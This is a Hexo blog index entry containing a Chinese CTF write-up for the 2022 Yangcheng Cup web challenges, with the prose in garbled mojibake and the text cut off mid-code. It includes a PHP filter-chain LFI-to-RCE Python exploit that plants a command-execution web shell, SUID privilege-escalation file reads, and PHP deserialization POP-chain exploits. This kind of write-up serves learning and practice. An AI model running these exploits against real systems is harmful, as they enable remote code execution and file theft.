<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›Writeup</title>
      <link href="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/"/>
      <url>/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>By ACT</p><p>2022.9.4</p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-rce-me"><a href="#1-rce-me" class="headerlink" title="1.rce_me"></a>1.rce_me</h3><p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ä»£ç ä¸­<code>include $file;</code>ï¼Œå°±æƒ³èµ·äº†hxp çš„ä¸€é“é¢˜<a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving â€œincluderâ€™s revengeâ€ from hxp ctf 2021 without controlling any files</a>,æœ‰å¸ˆå‚…ä¹Ÿç»™å‡ºäº†å…·ä½“çš„è¯¦ç»†åˆ†æï¼Œè§<a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p><p>ä½†æ˜¯é¢˜ç›®ç¯å¢ƒæ²¡æœ‰å¿½ç•¥æŠ¥é”™ï¼Œæ‰€ä»¥ç›´æ¥æ‰“æ–‡ç« ä¸­çš„exp,æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><p>1.ä»£ç ä¸­è¿‡æ»¤äº†<code>_</code>,æ–‡ç« ä¸­çš„exp payloadå¸¦<code>4</code>(å¯¹åº”çš„è½¬æ¢è¯­å¥å¸¦<code>_</code>)ï¼Œå› æ­¤æ”»å‡»çš„payloadæœ€ç»ˆä¼šæœ‰<code>_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line"><span class="comment"># æœ‰_</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>2.ç”±äº<code>include phpä»£ç </code>ï¼Œä¸”ç¯å¢ƒæ²¡æœ‰å¿½ç•¥æŠ¥é”™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥å¯¹åé¢ä¹±ç è¿›è¡Œæ³¨é‡Šã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &lt;?=`$_GET[0]`;;/*</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Lyo&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç è§£å†³äº†ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿå¯ä»¥ç®€å•ç†è§£ä¸ºï¼š</p><ol><li>é¿å…äº†<code>4</code>,å› ä¸ºä»–å¯¹åº”çš„è½¬æ¢å¸¦<code>_</code></li><li>æ³¨é‡Šäº†åé¢å½¢æˆä¹±ç çš„PHPä»£ç </li></ol><p>åŸæ–‡ä¸­ç”±äºæ²¡æœ‰<code>Lyo</code>è¿™ä¸‰ä¸ªå­—ç¬¦å¯¹åº”çš„å½¢æˆè½¬æ¢è¯­å¥ï¼Œæ‰€ä»¥å€ŸåŠ©<a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a>è¿™ä¸ªé¡¹ç›®ï¼Œé¡¹ç›®å°†å•å­—æ¯æ•°å­—åŸºæœ¬éƒ½fuzzåˆ°äº†ã€‚æ ¹æ®ä»¥ä¸Šæˆ‘ä»¬å¯æ„é€ rce payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80.endpoint-f0cb7de3c6d445ca9916505908395850.dasc.buuoj.cn:81/&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;/*</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Lyo&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c in base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = f<span class="string">&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(final_payload)</span></span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904102910545.png"></p><p>ä½†è¿™é¢˜åé¢è¿˜å¾—ç»•ï¼Œé»˜è®¤æ˜¯<code>www-data</code>æƒé™ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯SUIDææƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=final_payload&amp;<span class="number">0</span>=find+/+-user+root+-perm+-<span class="number">4000</span>+-<span class="keyword">print</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/date# å¯è¯»æ–‡ä»¶</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼šfinal_payloadæ˜¯ä¸Šé¢pythonè„šæœ¬ç”Ÿæˆçš„</p></blockquote><p>å› ä¸ºè„šæœ¬è¿‡æ»¤äº†<code>&gt;</code>ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡base64ç¼–ç ç»•è¿‡</p><blockquote><p>è¿™é‡Œè¦ç»•<code>&gt;</code>ç­‰ç‰¹æ®Šå­—ç¬¦çš„åŸå› æ˜¯ï¼Œ<code>date -f /flag</code> æå–flagæ˜¯é€šè¿‡<code>æ ‡å‡†é”™è¯¯è¾“å‡º -&gt; 2</code>æ‰“å°çš„ï¼Œè¯·æ±‚å“åº”ä¸æ˜¾ç¤ºã€‚æ‰€ä»¥æˆ‘ä»¬é”™è¯¯è¾“å‡ºè½¬æ ‡å‡†è¾“å‡ºï¼Œæ—¢<code>2&gt;&amp;1</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ouo@GOTA:~$ <span class="built_in">echo</span> <span class="string">&quot;date -f /flag 2&gt;&amp;1&quot;</span> | <span class="built_in">base64</span></span><br><span class="line">ZGF0ZSAtZiAvZmxhZyAyPiYxCg==</span><br><span class="line">ouo@GOTA:~$ <span class="built_in">echo</span> ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|<span class="built_in">base64</span> -d</span><br><span class="line"><span class="built_in">date</span> -f /flag 2&gt;&amp;1</span><br><span class="line">ouo@GOTA:~$ <span class="built_in">echo</span> ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|<span class="built_in">base64</span> -d | sh</span><br><span class="line"><span class="built_in">date</span>: invalid <span class="built_in">date</span> â€˜Tao By ACT.â€™</span><br><span class="line">ouo@GOTA:~$</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904103942017.png"></p><p>æœ‰å…³SUIDè¯»å–æ–‡ä»¶å°æŠ€å·§å¯çœ‹ï¼š<a href="https://gtfobins.github.io/">GTFOBins </a></p><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæœ€ç»ˆè·å–flagçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=final_payload&amp;<span class="number">0</span>=<span class="keyword">echo</span>+ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64+-d|sh </span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904104235612.png"></p><h3 id="2-step-by-step-v3"><a href="#2-step-by-step-v3" class="headerlink" title="2.step_by_step-v3"></a>2.step_by_step-v3</h3><p>å­˜åœ¨ååºåˆ—åŒ–</p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195102232.png"></p><p>å…¥å£åœ¨<code>cheng::__wakeup()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;c1 æŒ‡å‘ new bei() å¯ä»¥è°ƒç”¨beiç±»çš„__set()é­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195025128.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;b1 æŒ‡å‘new yang() å¯ä»¥è°ƒç”¨yangç±»çš„__toString()é­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195224768.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;y1å¯æ§ï¼Œè¿™é‡Œå¯ä»¥æ‰§è¡Œphpinfoå‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195422375.png"></p><p>æ„é€ expå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;c1 = <span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;b1 = <span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$y2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†expç”Ÿæˆçš„payloadæ”¾å…¥POSTä¼ è¾“,åœ¨phpinfoé‡Œé¢å¯ä»¥çœ‹åˆ°flag</p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220903195749190.png"></p><h3 id="3-Safepop"><a href="#3-Safepop" class="headerlink" title="3.Safepop"></a>3.Safepop</h3><blockquote><p>ç®€å•çš„popé“¾æ„é€ </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Test</span>::<span class="title function_ invoke__">getFlag</span>()-&gt;<span class="title class_">Fun</span>::<span class="title function_ invoke__">__call</span>(ç»•__wakeup) -&gt; A::<span class="title function_ invoke__">__get</span>() -&gt; B::<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"><span class="comment"># A-&gt;a = Fun()</span></span><br><span class="line"><span class="comment"># B-&gt;a = A()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __call é€šè¿‡call_user_func_arrayè°ƒç”¨æ•°ç»„ä¼ å‚ -&gt; Fun-&gt;func=[new Test,&#x27;getFlag&#x27;]</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = [<span class="keyword">new</span> <span class="title class_">Test</span>,<span class="string">&#x27;getFlag&#x27;</span>]; <span class="comment">// or $this-&gt;func = &quot;Test::getFlag&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$T</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$F</span> = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$F</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;Fun&quot;:1:&#x27;</span>,<span class="string">&#x27;&quot;Fun&quot;:2:&#x27;</span>,<span class="variable">$aser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span 